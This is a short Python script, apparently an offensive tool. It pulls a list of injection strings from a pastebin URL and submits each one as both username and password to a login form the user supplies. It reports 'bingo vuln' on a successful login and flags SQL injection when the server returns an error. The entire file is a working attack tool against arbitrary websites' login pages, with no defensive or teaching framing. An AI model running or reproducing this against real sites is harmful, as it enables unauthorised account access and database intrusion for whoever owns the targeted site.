import requests as p
from time import sleep
from rich.console import Console
from rich import print
import sys


def loading(tugas):
    console = Console()
    tasks = f"task {tugas}" 

    with console.status("[bold green]Working on tasks...") as status:
        sleep(1)
        console.log(f"{tasks} complete")

def run(query):
    console = Console()
    link = console.input(str("[bold green][+][/bold green] input url post: "))
    username = console.input(str("[bold green][+][/bold green] input form username: "))
    password = console.input(str("[bold green][+][/bold green] input form password: "))
    submit = console.input(str("[bold green][+][/bold green] input button submit (optional): "))
    for a in query:
        if len(submit) != 0:
            submit = submit
            req = {username : a, password : a, submit : "submitLogin"}
        elif len(submit) == 0:
           req = {
            username : a,
            password : a
            }
        login = p.post(link, data=req)
        if "logout" in login.text:
            loading(a)
            b = f"bingo vuln u/p : {a}"
            console.log(b)
            sys.exit()
        elif login.status_code == 500:
            loading(a)
            b = f"vuln sqli this website on username"
            console.log(b) 
            c = console.input(str("[bold green][+][/bold green] skip? or stop?[Y/N] "))
            if c.lower() == "y":
                sys.exit()
            else:
                pass
        else:
            loading(a)      
        

if __name__ == "__main__":
    get_file = p.get("https://pastebin.com/raw/9yFvPVHp").text
    load_file = get_file.split("\r\n")
    tugas = run(load_file)
